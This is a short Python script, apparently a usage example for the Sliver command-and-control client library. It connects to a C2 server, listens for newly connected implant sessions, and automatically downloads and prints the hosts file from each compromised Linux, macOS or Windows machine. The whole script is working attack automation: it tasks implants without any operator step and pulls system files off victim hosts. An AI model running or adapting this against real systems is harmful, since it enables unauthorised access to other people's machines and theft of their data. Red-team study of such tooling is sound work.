#!/usr/bin/env python3

import os
import asyncio
from sliver import SliverClientConfig, SliverClient 
import gzip

DEFAULT_CONFIG = ""

async def main():
    ''' Client connect example '''
    config = SliverClientConfig.parse_config_file(DEFAULT_CONFIG)
    client = SliverClient(config)
    await client.connect()

    async for event in client.on('session-connected'):
        print('Automatically interacting with session %s' % event.Session.ID)

        interact = await client.interact_session(event.Session.ID)

        if event.Session.OS in ["darwin", "linux"]:
            # dump /etc/hosts
            check_exists = await interact.ls("/etc/hosts")
            if check_exists.Exists:
                gzipFile = await interact.download("/etc/hosts")
                contents = gzip.decompress(gzipFile.Data)
                print('%r' % contents)
    
        elif event.Session.OS == "windows":
            file_listing = await interact.ls("C:/Windows/System32/drivers/etc/hosts")
            if file_listing.Exists:
                gzipFile = await interact.download("C:/Windows/System32/drivers/etc/hosts")
                contents = gzip.decompress(gzipFile.Data)
                print('%r' % contents)
        else:
            print('Session is running on %s', event.Session.OS)

if __name__ == '__main__':
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())
